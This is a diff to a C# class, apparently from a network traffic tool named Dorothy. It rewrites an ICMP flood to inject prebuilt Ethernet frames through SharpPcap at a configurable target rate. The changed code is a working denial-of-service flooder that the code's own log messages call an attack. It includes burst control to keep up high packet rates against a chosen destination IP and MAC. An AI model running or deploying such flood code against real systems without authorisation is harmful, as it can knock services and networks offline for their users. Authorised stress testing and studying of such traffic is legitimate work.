@@ -5,22 +5,31 @@ using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Net.Sockets;
 using System.Diagnostics;
 using NLog;
 using PacketDotNet;
+using PacketDotNet.Utils;
 using SharpPcap;
 using SharpPcap.LibPcap;
-using Dorothy.Models;
 
 namespace Dorothy.Models
 {
+    /// <summary>
+    /// ICMP Echo Request flood using SharpPcap Layer-2 injection.
+    ///
+    /// Switching from raw socket to SharpPcap ensures:
+    ///  - The PacketSent event carries the full Ethernet frame (L2 bytes), so the UI's
+    ///    Mbps display uses the same byte count as the wire-level rate controller — making
+    ///    displayed Mbps == entered Mbps.
+    ///  - No dependency on OS raw-socket rate-limiting or per-socket overhead caps.
+    /// </summary>
     public class IcmpFlood : IDisposable
     {
         private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
         private readonly PacketParameters _params;
         private readonly CancellationToken _cancellationToken;
-        private Socket? _socket;
+        private LibPcapLiveDevice? _device;
+
         public event EventHandler<PacketEventArgs>? PacketSent;
 
         public IcmpFlood(PacketParameters parameters, CancellationToken cancellationToken)
@@ -34,117 +43,159 @@ namespace Dorothy.Models
             PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
         }
 
+        private static ushort IcmpChecksum(byte[] data)
+        {
+            long sum = 0;
+            int i = 0;
+            while (i < data.Length - 1) { sum += (data[i] << 8) | data[i + 1]; i += 2; }
+            if (i < data.Length) sum += data[i] << 8;
+            while (sum >> 16 != 0) sum = (sum & 0xFFFF) + (sum >> 16);
+            return (ushort)~sum;
+        }
+
         public async Task StartAsync()
         {
             Logger.Info("Starting ICMP Flood attack.");
 
             try
             {
-                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp);
-                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);
+                _device = CaptureDeviceList.Instance
+                    .OfType<LibPcapLiveDevice>()
+                    .FirstOrDefault(d => d.Addresses.Any(addr =>
+                        addr.Addr.ipAddress != null &&
+                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));
 
-                byte[] icmpHeader = new byte[8];
-                byte[] payload = new byte[1400];
+                if (_device == null)
+                {
+                    Logger.Error("No device found with the specified source IP.");
+                    throw new Exception("No device found with the specified source IP.");
+                }
+
+                _device.Open(DeviceModes.Promiscuous, 1000);
+
+                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
+                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));
 
                 var random = new Random();
-                // Account for full Ethernet frame: Ethernet header (14) + IP header (20) + ICMP header (8) + payload (1400) + FCS (4)
-                // Raw sockets send at Layer 3, OS adds Ethernet frame
-                int totalPacketSize = 14 + 20 + icmpHeader.Length + payload.Length + 4; // Ethernet (14) + IP (20) + ICMP (8) + payload (1400) + FCS (4) = 1446 bytes
+                const int payloadSize = 1400;
+                const int icmpHeaderSize = 8;
+                const int icmpTotalSize = icmpHeaderSize + payloadSize; // 1408 bytes
+                const int poolSize = 500;
+
+                // Pre-generate packet pool.
+                // Each ICMP packet has a freshly randomized payload and a correct checksum.
+                // Using separate objects per pool slot avoids any PacketDotNet caching issue.
+                var packetPool = new byte[poolSize][];
+
+                for (int i = 0; i < poolSize; i++)
+                {
+                    var icmpRaw = new byte[icmpTotalSize];
+                    icmpRaw[0] = 8;  // Type: Echo Request
+                    icmpRaw[1] = 0;  // Code: 0
+                    // Identifier: use lower 16 bits of process ID
+                    int pid = Environment.ProcessId;
+                    icmpRaw[4] = (byte)(pid >> 8);
+                    icmpRaw[5] = (byte)pid;
+                    // Sequence number per pool slot
+                    icmpRaw[6] = (byte)(i >> 8);
+                    icmpRaw[7] = (byte)i;
+                    // Randomize payload
+                    random.NextBytes(icmpRaw.AsSpan(icmpHeaderSize));
+                    // Compute ICMP checksum (bytes 2-3 zeroed by default from new byte[])
+                    ushort cs = IcmpChecksum(icmpRaw);
+                    icmpRaw[2] = (byte)(cs >> 8);
+                    icmpRaw[3] = (byte)cs;
+
+                    var icmpPacket = new IcmpV4Packet(new ByteArraySegment(icmpRaw));
+                    var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
+                    {
+                        Protocol = PacketDotNet.ProtocolType.Icmp,
+                        TimeToLive = _params.Ttl,
+                        Id = (ushort)random.Next(0, 65536)
+                    };
+                    var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
+
+                    ipPacket.PayloadPacket = icmpPacket;
+                    ethernetPacket.PayloadPacket = ipPacket;
+                    // Compute IP header checksum (ICMP has no IP pseudo-header)
+                    ipPacket.UpdateCalculatedValues();
+
+                    packetPool[i] = ethernetPacket.Bytes;
+                }
+
+                // L2 frame = Eth(14) + IP(20) + ICMP(1408) = 1442 bytes
+                // Wire = L2 + FCS(4) = 1446 bytes — matches rate control accounting
+                int wirePacketSize = packetPool[0].Length + 4;
+                double targetMbps = _params.BytesPerSecond * 8.0 / 1_000_000;
+                Logger.Info($"ICMP packet: {packetPool[0].Length} bytes ({wirePacketSize} bytes on wire), target={targetMbps:F2} Mbps");
 
                 await Task.Run(() =>
                 {
                     var stopwatch = Stopwatch.StartNew();
-                    var endpoint = new IPEndPoint(_params.DestinationIp, 0);
-                    byte[] fullPacket = new byte[icmpHeader.Length + payload.Length];
-                    
-                    // Byte-budget rate control: track bytes sent vs time elapsed
                     long bytesSent = 0;
                     long targetBytesPerSecond = _params.BytesPerSecond;
-                    double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;
-                    
-                    // Rate measurement for logging/UI only (not used for timing)
+
                     var measurementStartTime = stopwatch.ElapsedTicks;
                     long measurementStartBytes = 0;
-                    const int measurementWindowMs = 500; // Measure every 500ms
+                    const int measurementWindowMs = 500;
                     double smoothedActualMbps = 0;
-                    const double smoothingAlpha = 0.3; // Exponential smoothing factor
-                    
-                    // Determine if low rate (for Windows-friendly waiting)
-                    bool isLowRate = targetMbps < 5.0;
-                    int sleepCounter = 0; // For mixing sleep with spin-wait at low rates
+                    const double smoothingAlpha = 0.3;
 
-                    stopwatch.Start();
+                    bool isLowRate = targetMbps < 5.0;
+                    int sleepCounter = 0;
+                    int poolIdx = 0;
 
                     while (!_cancellationToken.IsCancellationRequested)
                     {
                         try
                         {
-                            // Calculate how many bytes we're "allowed" to have sent so far
                             double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                             long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);
-                            
-                            // If we're behind budget, send packets (small burst)
+
                             if (bytesSent < allowedBytes)
                             {
-                                // Calculate how many packets we can send to catch up (but limit burst size)
                                 long bytesBehind = allowedBytes - bytesSent;
-                                int packetsToSend = Math.Min((int)(bytesBehind / totalPacketSize) + 1, 5); // Max 5 packets per iteration
-                                
+                                // Dynamic burst cap: higher burst at high rates to prevent underrun
+                                int maxBurst = targetMbps > 50 ? 50 : (targetMbps > 10 ? 20 : 10);
+                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, maxBurst);
+
                                 for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                 {
-                                    icmpHeader[0] = 8;  // Echo Request
-                                    random.NextBytes(payload);
-
-                                    Buffer.BlockCopy(icmpHeader, 0, fullPacket, 0, icmpHeader.Length);
-                                    Buffer.BlockCopy(payload, 0, fullPacket, icmpHeader.Length, payload.Length);
-
-                                    _socket.SendTo(fullPacket, endpoint);
-                                    OnPacketSent(fullPacket, _params.SourceIp, _params.DestinationIp, 0);
-                                    
-                                    bytesSent += totalPacketSize;
+                                    _device.SendPacket(packetPool[poolIdx]);
+                                    OnPacketSent(packetPool[poolIdx], _params.SourceIp, _params.DestinationIp, 0);
+                                    bytesSent += wirePacketSize;
+                                    poolIdx = (poolIdx + 1) % poolSize;
                                 }
                             }
                             else
                             {
-                                // We're at or above budget - wait briefly
-                                // Windows-friendly waiting: spin-wait at high rates, mix sleep+spin at low rates
                                 if (isLowRate && sleepCounter++ % 10 == 0)
-                                {
-                                    // At low rates, sleep occasionally to avoid pegging CPU core
-                                    Thread.Sleep(0); // Yield to other threads
-                                }
+                                    Thread.Sleep(0);
                                 else
-                                {
-                                    // Short spin-wait for precision
                                     Thread.SpinWait(10);
-                                }
                             }
 
-                            // Rate measurement for logging/UI (time-based window, smoothed)
                             long currentTicks = stopwatch.ElapsedTicks;
                             double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;
-                            
+
                             if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                             {
                                 long bytesInWindow = bytesSent - measurementStartBytes;
                                 double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);
-                                
-                                // Exponential smoothing to reduce Windows jitter
-                                if (smoothedActualMbps == 0)
-                                    smoothedActualMbps = actualMbps;
-                                else
-                                    smoothedActualMbps = (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);
-                                
+
+                                smoothedActualMbps = smoothedActualMbps == 0
+                                    ? actualMbps
+                                    : (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);
+
                                 Logger.Info($"ICMP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");
-                                
-                                // Reset measurement window
+
                                 measurementStartTime = currentTicks;
                                 measurementStartBytes = bytesSent;
                             }
                         }
                         catch (Exception ex)
                         {
-                            Logger.Error(ex, "Failed sending ICMP packet (Layer 3).");
+                            Logger.Error(ex, "Failed sending ICMP packet.");
                         }
                     }
                 }, _cancellationToken);
@@ -154,14 +205,18 @@ namespace Dorothy.Models
                 Logger.Error(ex, "ICMP Flood attack failed.");
                 throw;
             }
+            finally
+            {
+                _device?.Close();
+            }
         }
 
         public void Dispose()
         {
-            _socket?.Dispose();
+            _device?.Close();
         }
 
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
         private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
     }
-} 
+}
